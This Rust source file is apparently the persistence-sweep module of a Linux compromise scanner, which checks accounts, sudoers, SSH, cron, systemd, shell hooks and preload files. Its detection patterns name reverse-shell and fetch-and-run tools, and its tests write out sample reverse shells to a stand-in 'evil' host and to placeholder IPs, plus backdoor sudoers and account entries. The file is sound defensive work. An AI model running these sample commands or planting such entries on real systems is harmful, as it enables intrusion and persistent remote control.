//! Persistence sweep. Works on the live system and on offline roots through `Root`, so the
//! same checks run where the rootkit can and cannot interfere.

use crate::config::ScanConfig;
use crate::pkg::{self, Ownership};
use crate::report::{progress as prog, send, Finding, ScanEvent, Sender, Severity};
use crate::util::{self, Root};
use regex::RegexSet;
use std::os::unix::fs::MetadataExt;
use std::sync::OnceLock;
use std::time::Instant;

pub const MODULE: &str = "PERSIST";
const CAP: usize = 4 * 1024 * 1024;

fn progress(tx: &Sender, msg: &str) {
    prog(tx, MODULE, msg)
}

/// Commands that have no business inside persistence entries.
pub fn danger_set() -> &'static RegexSet {
    static S: OnceLock<RegexSet> = OnceLock::new();
    S.get_or_init(|| {
        RegexSet::new([
            r"(?i)/dev/(tcp|udp)/",
            r"(?i)\b(nc|ncat|netcat)\b.*\s-(e|c)\s",
            r"(?i)\bbash\s+-i\b",
            r"(?i)\bsocat\b.*exec:",
            r"(?i)\b(curl|wget)\b[^|;]*\|\s*(ba)?sh\b",
            r"(?i)\bpython[0-9.]*\s+-c\s.*(socket|pty|exec\()",
            r"(?i)\bperl\s+-e\s.*socket",
            r"(?i)base64\s+(-d|--decode)",
            r"(?i)\bmkfifo\b",
            r"(?i)\bxmrig\b|stratum\+tcp",
        ])
        .expect("regex")
    })
}

pub fn warn_set() -> &'static RegexSet {
    static S: OnceLock<RegexSet> = OnceLock::new();
    S.get_or_init(|| {
        RegexSet::new([
            r"(?:^|[\s=;'\x22])/(tmp|var/tmp|dev/shm)/",
            r"(?i)\b(curl|wget)\s",
            r"(?i)\bchmod\s+(\+x|777|[ug]\+s)",
            r"(?i)LD_PRELOAD=",
            r"(?i)\bnohup\b.*&\s*$",
        ])
        .expect("regex")
    })
}

/// Classify a line of a persistence file. Returns severity if suspicious.
pub fn classify(line: &str) -> Option<Severity> {
    let t = line.trim();
    if t.is_empty() || t.starts_with('#') {
        return None;
    }
    if danger_set().is_match(t) {
        Some(Severity::Danger)
    } else if warn_set().is_match(t) {
        Some(Severity::Warning)
    } else {
        None
    }
}

/// Stock, unmodified package files only get reported for Danger-level content.
fn keep(root: &Root, path: &str, sev: Severity) -> bool {
    sev == Severity::Danger || !pkg::is_pristine(root, path)
}

fn scan_text(root: &Root, tx: &Sender, path: &str, category: &str, label: &str) -> usize {
    let content = match root.read_string(path, CAP) {
        Some(c) => c,
        None => return 0,
    };
    let pristine = pkg::is_pristine(root, path);
    let mut n = 0;
    for (i, line) in content.lines().enumerate() {
        if let Some(sev) = classify(line).filter(|s| *s == Severity::Danger || !pristine) {
            n += 1;
            send(
                tx,
                Finding::new(sev, MODULE, category, &format!("Suspicious {} entry in {} (line {})", label, root.display(path), i + 1))
                    .with_detail(&util::truncate(line.trim(), 300))
                    .subject(&format!("{}:{}", path, util::truncate(line.trim(), 80)))
                    .artifact(&root.display(path)),
            );
        }
    }
    n
}

fn file_perms_check(root: &Root, tx: &Sender, path: &str, category: &str) {
    if let Some(meta) = root.lstat(path) {
        if meta.is_file() && (meta.uid() != 0 || meta.mode() & 0o022 != 0) {
            send(
                tx,
                Finding::new(
                    Severity::Warning,
                    MODULE,
                    category,
                    &format!("{} is writable by non-root (uid {}, mode {:o})", root.display(path), meta.uid(), meta.mode() & 0o7777),
                )
                .with_detail("Anyone who can write this file can execute code as root")
                .subject(&format!("perm:{}", path)),
            );
        }
    }
}

// ───────────────────────── accounts ─────────────────────────

fn accounts(root: &Root, tx: &Sender) {
    progress(tx, "Checking accounts (passwd/shadow/group)...");
    let users = util::users(root);
    for u in &users {
        if u.uid == 0 && u.name != "root" {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "UID0 Account", &format!("Account '{}' has uid 0 — a second root", u.name))
                    .with_detail(&format!("home={} shell={}", u.home, u.shell))
                    .subject(&format!("uid0:{}", u.name)),
            );
        }
    }
    let shadow = root.read_string("/etc/shadow", CAP).unwrap_or_default();
    let today = util::now_epoch() / 86400;
    for line in shadow.lines() {
        let f: Vec<&str> = line.split(':').collect();
        if f.len() < 3 {
            continue;
        }
        let (name, hash) = (f[0], f[1]);
        let user = users.iter().find(|u| u.name == name);
        let login = user.map(|u| util::has_login_shell(&u.shell)).unwrap_or(false);
        if hash.is_empty() && login {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Empty Password", &format!("Account '{}' has an EMPTY password and a login shell", name))
                    .subject(&format!("emptypw:{}", name)),
            );
        }
        let locked = hash.starts_with('!') || hash.starts_with('*') || hash.is_empty();
        if let Some(u) = user {
            if u.uid > 0 && u.uid < 1000 && login && !locked {
                send(
                    tx,
                    Finding::new(
                        Severity::Warning,
                        MODULE,
                        "System Account Shell",
                        &format!("System account '{}' (uid {}) has a password and login shell {}", name, u.uid, u.shell),
                    )
                    .with_detail("Attackers revive daemon accounts (e.g. 'games', 'news') to blend in")
                    .subject(&format!("sysacct:{}", name)),
                );
            }
        }
        if let Ok(lastchg) = f[2].parse::<i64>() {
            if !locked && today - lastchg <= 7 && today >= lastchg {
                send(
                    tx,
                    Finding::new(
                        Severity::Info,
                        MODULE,
                        "New Account",
                        &format!("Password for '{}' was set/changed in the last {} day(s)", name, today - lastchg),
                    )
                    .subject(&format!("recentpw:{}", name)),
                );
            }
        }
    }
    if let Some(group) = root.read_string("/etc/group", CAP) {
        for line in group.lines() {
            let f: Vec<&str> = line.split(':').collect();
            if f.len() >= 4 && (f[0] == "sudo" || f[0] == "wheel" || f[0] == "root" || f[0] == "docker" || f[0] == "lxd" || f[0] == "disk") && !f[3].is_empty()
            {
                send(
                    tx,
                    Finding::new(Severity::Info, MODULE, "Privileged Group", &format!("Group '{}' members: {}", f[0], f[3]))
                        .subject(&format!("group:{}", f[0])),
                );
            }
        }
    }
}

// ───────────────────────── sudo / ssh ─────────────────────────

fn sudoers(root: &Root, tx: &Sender) {
    progress(tx, "Checking sudoers...");
    let mut files = vec!["/etc/sudoers".to_string()];
    files.extend(root.read_dir("/etc/sudoers.d").into_iter().map(|n| format!("/etc/sudoers.d/{}", n)));
    for path in files {
        file_perms_check(root, tx, &path, "Sudoers");
        let content = match root.read_string(&path, CAP) {
            Some(c) => c,
            None => continue,
        };
        for line in content.lines().map(|l| l.trim()).filter(|l| !l.starts_with('#') && !l.is_empty()) {
            if line.contains("NOPASSWD") && line.contains("ALL") {
                let who = line.split_whitespace().next().unwrap_or("");
                let sev = if who == "ALL" || who == "%users" || who == "%everyone" { Severity::Danger } else { Severity::Info };
                send(
                    tx,
                    Finding::new(sev, MODULE, "Sudoers", &format!("Passwordless root for '{}' in {}", who, root.display(&path)))
                        .with_detail(line)
                        .subject(&format!("{}:{}", path, line)),
                );
            }
            if line.starts_with("Defaults") && (line.contains("!authenticate") || line.contains("env_keep") && line.contains("LD_PRELOAD")) {
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Sudoers", &format!("Dangerous sudo default in {}", root.display(&path)))
                        .with_detail(line)
                        .subject(&format!("{}:{}", path, line)),
                );
            }
        }
    }
}

fn sshd_config(root: &Root, tx: &Sender) {
    progress(tx, "Checking sshd configuration...");
    let mut files = vec!["/etc/ssh/sshd_config".to_string()];
    files.extend(root.read_dir("/etc/ssh/sshd_config.d").into_iter().filter(|n| n.ends_with(".conf")).map(|n| format!("/etc/ssh/sshd_config.d/{}", n)));
    for path in files {
        let content = match root.read_string(&path, CAP) {
            Some(c) => c,
            None => continue,
        };
        for line in content.lines().map(|l| l.trim()).filter(|l| !l.starts_with('#') && !l.is_empty()) {
            let mut it = line.split_whitespace();
            let key = it.next().unwrap_or("").to_lowercase();
            let val = it.collect::<Vec<_>>().join(" ");
            let (sev, why) = match key.as_str() {
                "permitemptypasswords" if val.eq_ignore_ascii_case("yes") => (Severity::Danger, "empty passwords allowed"),
                "permitrootlogin" if val.eq_ignore_ascii_case("yes") => (Severity::Warning, "root may log in with a password"),
                "authorizedkeysfile"
                    if !val.split_whitespace().all(|v| v == ".ssh/authorized_keys" || v == ".ssh/authorized_keys2" || v == "%h/.ssh/authorized_keys") =>
                {
                    (Severity::Warning, "non-default AuthorizedKeysFile — keys may be hidden elsewhere")
                }
                "authorizedkeyscommand" => (Severity::Warning, "keys come from an external command"),
                "forcecommand" => (Severity::Info, "ForceCommand set"),
                "passwordauthentication" if val.eq_ignore_ascii_case("yes") => (Severity::Info, "password authentication enabled"),
                _ => continue,
            };
            send(tx, Finding::new(sev, MODULE, "SSHD Config", &format!("{}: {} ({})", root.display(&path), line, why)).subject(&format!("{}:{}", path, key)));
        }
    }
}

fn authorized_keys(root: &Root, tx: &Sender) {
    progress(tx, "Checking authorized_keys for every user...");
    let mut total = 0;
    for (user, home) in util::interesting_homes(root) {
        for file in [".ssh/authorized_keys", ".ssh/authorized_keys2"] {
            let path = format!("{}/{}", home, file);
            let content = match root.read_string(&path, CAP) {
                Some(c) => c,
                None => continue,
            };
            if let Some(meta) = root.lstat(&path) {
                if meta.mode() & 0o022 != 0 {
                    send(
                        tx,
                        Finding::new(Severity::Warning, MODULE, "Authorized Keys", &format!("{} is group/world writable", root.display(&path)))
                            .subject(&format!("perm:{}", path)),
                    );
                }
            }
            for line in content.lines().map(|l| l.trim()).filter(|l| !l.is_empty() && !l.starts_with('#')) {
                total += 1;
                let comment = line.split_whitespace().last().unwrap_or("");
                if line.contains("command=") {
                    let sev = if classify(line).is_some() { Severity::Danger } else { Severity::Warning };
                    send(
                        tx,
                        Finding::new(sev, MODULE, "SSH Forced Cmd", &format!("Key with forced command for {} ({})", user, root.display(&path)))
                            .with_detail(&util::truncate(line, 300))
                            .subject(&format!("{}:{}", path, comment)),
                    );
                }
                if line.contains("environment=") && line.contains("LD_PRELOAD") {
                    send(
                        tx,
                        Finding::new(Severity::Danger, MODULE, "SSH Key", &format!("Key sets LD_PRELOAD for {}", user))
                            .with_detail(&util::truncate(line, 300))
                            .subject(&format!("{}:env", path)),
                    );
                }
            }
        }
    }
    send(tx, Finding::new(Severity::Info, MODULE, "Authorized Keys", &format!("{} authorized key(s) across all users", total)).subject("ak-total"));
}

// ───────────────────────── scheduled execution ─────────────────────────

fn cron(root: &Root, tx: &Sender) {
    progress(tx, "Checking system and user crontabs, at jobs...");
    let mut files = vec!["/etc/crontab".to_string(), "/etc/anacrontab".to_string()];
    for dir in [
        "/etc/cron.d",
        "/etc/cron.hourly",
        "/etc/cron.daily",
        "/etc/cron.weekly",
        "/etc/cron.monthly",
        "/var/spool/cron",
        "/var/spool/cron/crontabs",
        "/var/spool/cron/atjobs",
        "/var/spool/at",
    ] {
        for n in root.read_dir(dir) {
            let p = format!("{}/{}", dir, n);
            if root.lstat(&p).map(|m| m.is_file()).unwrap_or(false) {
                files.push(p);
            }
        }
    }
    for f in &files {
        let cat = if f.contains("/at") { "At Job" } else { "Cron" };
        scan_text(root, tx, f, cat, "cron");
        if f.starts_with("/etc/cron") || f == "/etc/crontab" {
            file_perms_check(root, tx, f, "Cron");
        }
    }
}

fn systemd(root: &Root, tx: &Sender) {
    progress(tx, "Checking systemd units, timers, drop-ins and generators...");
    let mut dirs: Vec<String> = [
        "/etc/systemd/system",
        "/run/systemd/system",
        "/usr/lib/systemd/system",
        "/lib/systemd/system",
        "/usr/local/lib/systemd/system",
        "/etc/systemd/user",
        "/usr/lib/systemd/user",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    for (_, home) in util::interesting_homes(root) {
        dirs.push(format!("{}/.config/systemd/user", home));
    }
    let mut seen = std::collections::HashSet::new();
    for dir in dirs {
        let mut stack = vec![dir.clone()];
        while let Some(d) = stack.pop() {
            for n in root.read_dir(&d) {
                let p = format!("{}/{}", d, n);
                let meta = match root.lstat(&p) {
                    Some(m) => m,
                    None => continue,
                };
                if meta.is_dir() && (n.ends_with(".d") || n.ends_with(".wants") || n.ends_with(".requires")) && d == dir {
                    stack.push(p);
                    continue;
                }
                if !meta.is_file()
                    || !(n.ends_with(".service") || n.ends_with(".timer") || n.ends_with(".conf") || n.ends_with(".socket") || n.ends_with(".path"))
                {
                    continue;
                }
                let real = root.resolve(&p).map(|x| root.inner(&x)).unwrap_or(p.clone());
                if !seen.insert(real.clone()) {
                    continue;
                }
                let content = match root.read_string(&p, CAP) {
                    Some(c) => c,
                    None => continue,
                };
                for line in content.lines() {
                    let t = line.trim();
                    let is_exec = ["ExecStart", "ExecStartPre", "ExecStartPost", "ExecStop", "ExecReload", "ExecCondition"].iter().any(|k| t.starts_with(k));
                    if !is_exec {
                        continue;
                    }
                    let cmd = t.split_once('=').map(|x| x.1).unwrap_or("").trim_start_matches(['-', '@', '+', '!', ':']);
                    let bin = cmd.split_whitespace().next().unwrap_or("");
                    let sev = if util::is_temp_path(bin) || bin.contains("/memfd:") || danger_set().is_match(cmd) {
                        Some(Severity::Danger)
                    } else if util::has_hidden_component(bin) || warn_set().is_match(cmd) || (bin.starts_with("/home/") || bin.starts_with("/root/")) {
                        Some(Severity::Warning)
                    } else {
                        None
                    };
                    if let Some(sev) = sev.filter(|s| keep(root, &p, *s)) {
                        let cat = if n.ends_with(".timer") { "Systemd Timer" } else { "Systemd Persistence" };
                        send(
                            tx,
                            Finding::new(sev, MODULE, cat, &format!("Suspicious unit command in {}", root.display(&p)))
                                .with_detail(&util::truncate(t, 300))
                                .subject(&format!("{}:{}", real, util::truncate(t, 60)))
                                .artifact(&root.display(&p)),
                        );
                    }
                }
            }
        }
    }
    for gdir in ["/etc/systemd/system-generators", "/usr/local/lib/systemd/system-generators", "/run/systemd/system-generators", "/etc/systemd/user-generators"]
    {
        for n in root.read_dir(gdir) {
            let p = format!("{}/{}", gdir, n);
            // a symlink to /dev/null *masks* a generator (admin hardening), and packaged
            // generators are stock
            if root.readlink(&p).map(|t| t == "/dev/null").unwrap_or(false) || pkg::owner(root, &p) == Ownership::Owned {
                continue;
            }
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Systemd Generator", &format!("Custom systemd generator: {}", root.display(&p)))
                    .with_detail("Generators run as root very early at every boot and daemon-reload")
                    .subject(&p)
                    .artifact(&root.display(&p)),
            );
        }
    }
}

// ───────────────────────── shell / login hooks ─────────────────────────

fn shell_hooks(root: &Root, tx: &Sender) {
    progress(tx, "Checking shell startup files, profile.d, rc.local, motd...");
    let mut files: Vec<(String, &str)> = vec![
        ("/etc/profile".into(), "Profile Script"),
        ("/etc/bash.bashrc".into(), "Profile Script"),
        ("/etc/bashrc".into(), "Profile Script"),
        ("/etc/zsh/zshrc".into(), "Profile Script"),
        ("/etc/zshenv".into(), "Profile Script"),
        ("/etc/environment".into(), "Profile Script"),
        ("/etc/rc.local".into(), "rc.local"),
        ("/etc/rc.d/rc.local".into(), "rc.local"),
    ];
    for n in root.read_dir("/etc/profile.d") {
        files.push((format!("/etc/profile.d/{}", n), "Profile Script"));
    }
    for n in root.read_dir("/etc/update-motd.d") {
        files.push((format!("/etc/update-motd.d/{}", n), "MOTD Script"));
    }
    for (_, home) in util::interesting_homes(root) {
        for f in [".bashrc", ".bash_profile", ".bash_login", ".profile", ".zshrc", ".zprofile", ".zshenv", ".bash_logout", ".config/fish/config.fish"] {
            files.push((format!("{}/{}", home, f), "Shell RC"));
        }
    }
    let alias_hijack =
        RegexSet::new([r"^\s*alias\s+(sudo|su|ssh|passwd)=", r"^\s*(sudo|su|ssh)\s*\(\)\s*\{", r"(?i)\bexport\s+(LD_PRELOAD|PROMPT_COMMAND)="]).expect("regex");
    for (path, cat) in files {
        scan_text(root, tx, &path, cat, "startup");
        if let Some(content) = root.read_string(&path, CAP) {
            for line in content.lines().filter(|l| alias_hijack.is_match(l)) {
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Shell Inject", &format!("Credential-stealing hook in {}", root.display(&path)))
                        .with_detail(&util::truncate(line.trim(), 300))
                        .subject(&format!("{}:{}", path, util::truncate(line.trim(), 60))),
                );
            }
        }
    }
    if let Some(m) = root.lstat("/etc/rc.local") {
        if m.is_file() && m.mode() & 0o111 != 0 {
            send(tx, Finding::new(Severity::Info, MODULE, "rc.local", "/etc/rc.local exists and is executable (runs at boot)").subject("rclocal"));
        }
    }
}

fn misc_hooks(root: &Root, tx: &Sender) {
    progress(tx, "Checking loader, udev, package-manager and autostart hooks...");
    // ld.so.preload — the single owner of this check
    if let Some(c) = root.read_string("/etc/ld.so.preload", CAP) {
        let libs: Vec<&str> = c.lines().map(|l| l.trim()).filter(|l| !l.is_empty() && !l.starts_with('#')).collect();
        if !libs.is_empty() {
            send(
                tx,
                Finding::new(
                    Severity::Danger,
                    MODULE,
                    "LD Preload",
                    &format!("{} lists {} librar(y/ies) — injected into EVERY process", root.display("/etc/ld.so.preload"), libs.len()),
                )
                .with_detail(&libs.join("\n"))
                .subject("ld.so.preload")
                .artifact(&root.display("/etc/ld.so.preload")),
            );
        }
    }
    for n in root.read_dir("/etc/ld.so.conf.d") {
        let p = format!("/etc/ld.so.conf.d/{}", n);
        if let Some(c) = root.read_string(&p, CAP) {
            for l in c.lines().map(|l| l.trim()).filter(|l| !l.is_empty() && !l.starts_with('#')) {
                if util::is_temp_path(&format!("{}/", l)) || util::has_hidden_component(l) || l.starts_with("/home") {
                    send(
                        tx,
                        Finding::new(Severity::Danger, MODULE, "LD Preload", &format!("Library search path {} in {}", l, root.display(&p)))
                            .subject(&format!("{}:{}", p, l)),
                    );
                }
            }
        }
    }
    for dir in ["/etc/udev/rules.d", "/usr/lib/udev/rules.d", "/lib/udev/rules.d", "/run/udev/rules.d"] {
        for n in root.read_dir(dir) {
            let p = format!("{}/{}", dir, n);
            if let Some(c) = root.read_string(&p, CAP) {
                for l in c.lines().filter(|l| l.contains("RUN+=") || l.contains("RUN=") || l.contains("PROGRAM=")) {
                    let sev = if danger_set().is_match(l) || l.contains("/tmp/") || l.contains("/dev/shm/") {
                        Some(Severity::Danger)
                    } else if warn_set().is_match(l) || (dir == "/etc/udev/rules.d" && (l.contains("/bin/sh") || l.contains("/bin/bash"))) {
                        Some(Severity::Warning)
                    } else {
                        None
                    };
                    if let Some(sev) = sev.filter(|s| keep(root, &p, *s)) {
                        send(
                            tx,
                            Finding::new(sev, MODULE, "Udev Rule", &format!("udev rule runs a command: {}", root.display(&p)))
                                .with_detail(&util::truncate(l.trim(), 300))
                                .subject(&format!("{}:{}", p, util::truncate(l, 60))),
                        );
                    }
                }
            }
        }
    }
    // apt / dnf / yum hooks
    for dir in ["/etc/apt/apt.conf.d"] {
        for n in root.read_dir(dir) {
            let p = format!("{}/{}", dir, n);
            if let Some(c) = root.read_string(&p, CAP) {
                for l in c.lines().filter(|l| l.contains("Invoke") || l.contains("Post-Invoke") || l.contains("Pre-Install-Pkgs")) {
                    if let Some(sev) = classify(l) {
                        send(
                            tx,
                            Finding::new(sev, MODULE, "Package Hook", &format!("APT hook runs a suspicious command: {}", root.display(&p)))
                                .with_detail(&util::truncate(l.trim(), 300))
                                .subject(&format!("{}:{}", p, util::truncate(l, 60))),
                        );
                    }
                }
            }
        }
    }
    for dir in ["/etc/dnf/plugins/post-transaction-actions.d", "/etc/yum/pluginconf.d"] {
        for n in root.read_dir(dir) {
            scan_text(root, tx, &format!("{}/{}", dir, n), "Package Hook", "package-manager hook");
        }
    }
    // XDG autostart (system + users)
    let mut autostart = vec!["/etc/xdg/autostart".to_string()];
    for (_, home) in util::interesting_homes(root) {
        autostart.push(format!("{}/.config/autostart", home));
    }
    for dir in autostart {
        for n in root.read_dir(&dir) {
            let p = format!("{}/{}", dir, n);
            if let Some(c) = root.read_string(&p, CAP) {
                for l in c.lines().filter(|l| l.starts_with("Exec=")) {
                    let cmd = &l[5..];
                    let bin = cmd.split_whitespace().next().unwrap_or("");
                    let sev = if danger_set().is_match(cmd) || util::is_temp_path(bin) {
                        Some(Severity::Danger)
                    } else if util::has_hidden_component(bin) || warn_set().is_match(cmd) {
                        Some(Severity::Warning)
                    } else {
                        None
                    };
                    if let Some(sev) = sev.filter(|s| keep(root, &p, *s)) {
                        send(
                            tx,
                            Finding::new(sev, MODULE, "XDG Autostart", &format!("Autostart entry runs {}", bin))
                                .with_detail(&format!("{}\n{}", root.display(&p), l))
                                .subject(&format!("{}:{}", p, bin)),
                        );
                    }
                }
            }
        }
    }
    // kernel module autoload
    let mut ml = vec!["/etc/modules".to_string()];
    for d in ["/etc/modules-load.d", "/usr/lib/modules-load.d", "/run/modules-load.d", "/etc/modprobe.d"] {
        ml.extend(root.read_dir(d).into_iter().map(|n| format!("{}/{}", d, n)));
    }
    let rk = ["diamorphine", "reptile", "bdvl", "jynx", "suterusu", "kovid", "khook", "rootkit", "hide"];
    for p in ml {
        if let Some(c) = root.read_string(&p, CAP) {
            for l in c.lines().map(|l| l.trim()).filter(|l| !l.is_empty() && !l.starts_with('#')) {
                let lower = l.to_lowercase();
                let install_cmd = (lower.starts_with("install ") || lower.starts_with("softdep "))
                    && (l.contains("/bin/sh") || l.contains("/tmp/") || danger_set().is_match(l));
                if rk.iter().any(|r| lower.contains(r)) || install_cmd {
                    send(
                        tx,
                        Finding::new(Severity::Danger, MODULE, "Module Autoload", &format!("Suspicious module autoload entry in {}", root.display(&p)))
                            .with_detail(l)
                            .subject(&format!("{}:{}", p, l)),
                    );
                } else if p.starts_with("/etc/modprobe.d") && lower.starts_with("install ") {
                    send(
                        tx,
                        Finding::new(Severity::Info, MODULE, "Module Autoload", &format!("modprobe 'install' hook in {}", root.display(&p)))
                            .with_detail(l)
                            .subject(&format!("{}:{}", p, l)),
                    );
                }
            }
        }
    }
}

/// Run every persistence check against a root (live "/" or offline disk).
pub fn scan_root(root: &Root, tx: &Sender) {
    accounts(root, tx);
    sudoers(root, tx);
    sshd_config(root, tx);
    authorized_keys(root, tx);
    cron(root, tx);
    systemd(root, tx);
    shell_hooks(root, tx);
    misc_hooks(root, tx);
}

pub fn scan(_cfg: &ScanConfig, tx: Sender) {
    let start = Instant::now();
    let _ = tx.send(ScanEvent::ModuleStart(MODULE.to_string()));
    scan_root(&Root::live(), &tx);
    let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::mpsc;

    #[test]
    fn classify_lines() {
        assert_eq!(classify("* * * * * root bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"), Some(Severity::Danger));
        assert_eq!(classify("*/5 * * * * root curl -fsSL http://x/y.sh | sh"), Some(Severity::Danger));
        assert_eq!(classify("@reboot root /tmp/.x/run"), Some(Severity::Warning));
        assert_eq!(classify("17 * * * * root cd / && run-parts --report /etc/cron.hourly"), None);
        assert_eq!(classify("# bash -i >& /dev/tcp/ commented"), None);
    }

    #[test]
    fn offline_persistence_detection() {
        let d = util::testutil::tempdir("persist");
        for dir in ["etc/cron.d", "etc/systemd/system", "etc/ssh", "root/.ssh", "etc/sudoers.d", "etc/pam.d"] {
            std::fs::create_dir_all(d.join(dir)).unwrap();
        }
        std::fs::write(d.join("etc/passwd"), "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\ngames:x:5:60::/usr/games:/bin/bash\n").unwrap();
        std::fs::write(d.join("etc/shadow"), "root:$6$abc:19000:0:99999:7:::\ntoor::19000::::::\ngames:$6$x:19000::::::\n").unwrap();
        std::fs::write(d.join("etc/cron.d/update"), "* * * * * root curl -s http://evil/x | bash\n").unwrap();
        std::fs::write(d.join("etc/systemd/system/dbus-helper.service"), "[Service]\nExecStart=/dev/shm/.k/helper\n").unwrap();
        std::fs::write(d.join("etc/ssh/sshd_config"), "PermitEmptyPasswords yes\n").unwrap();
        std::fs::write(d.join("etc/ld.so.preload"), "/usr/lib/libhide.so\n").unwrap();
        std::fs::write(d.join("root/.ssh/authorized_keys"), "command=\"/bin/bash -i >& /dev/tcp/1.1.1.1/9 0>&1\" ssh-ed25519 AAAA x\n").unwrap();
        std::fs::write(d.join("etc/sudoers.d/x"), "ALL ALL=(ALL) NOPASSWD: ALL\n").unwrap();
        let (tx, rx) = mpsc::channel();
        scan_root(&Root::new(&d), &tx);
        drop(tx);
        let cats: Vec<(Severity, String)> = rx
            .iter()
            .filter_map(|e| match e {
                ScanEvent::Finding(f) => Some((f.severity, f.category)),
                _ => None,
            })
            .collect();
        let has = |c: &str, s: Severity| cats.iter().any(|(sev, cat)| cat == c && *sev == s);
        assert!(has("UID0 Account", Severity::Danger));
        assert!(has("Empty Password", Severity::Danger));
        assert!(has("System Account Shell", Severity::Warning));
        assert!(has("Cron", Severity::Danger));
        assert!(has("Systemd Persistence", Severity::Danger));
        assert!(has("SSHD Config", Severity::Danger));
        assert!(has("LD Preload", Severity::Danger));
        assert!(has("SSH Forced Cmd", Severity::Danger));
        assert!(has("Sudoers", Severity::Danger));
        let _ = std::fs::remove_dir_all(d);
    }
}
